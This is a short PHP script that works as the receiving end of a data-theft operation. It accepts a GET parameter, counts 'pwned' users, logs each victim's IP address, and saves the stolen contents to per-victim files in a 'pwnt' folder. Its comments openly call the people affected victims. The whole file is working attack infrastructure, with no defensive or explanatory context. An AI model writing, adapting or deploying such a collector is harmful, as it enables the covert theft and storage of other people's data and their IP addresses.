<?php
      if( isset($_GET['a']) ) {
        
        $logfile = 'log.txt'; //total number of pwned users
        $number = file_get_contents($logfile);

        $number++; //increment number of pwned

        file_put_contents($logfile, $number); //save last number of pwned

        $ipAddress = $_SERVER['REMOTE_ADDR']; //get the victim's IP address (because we can, so why not)
        $contents = $_GET['a']; //the actual data we want

        //write the file with the contents. The file will be located at pwnt/recentservers-$number_($ipAddress).txt
        $fp = fopen('pwnt/recentservers-'.$number.'_('.$ipAddress.').txt','a+');
        $fwrite = fwrite($fp, $contents);
      
      } else { //if the contents isn't set, do nothing
        
      }
?>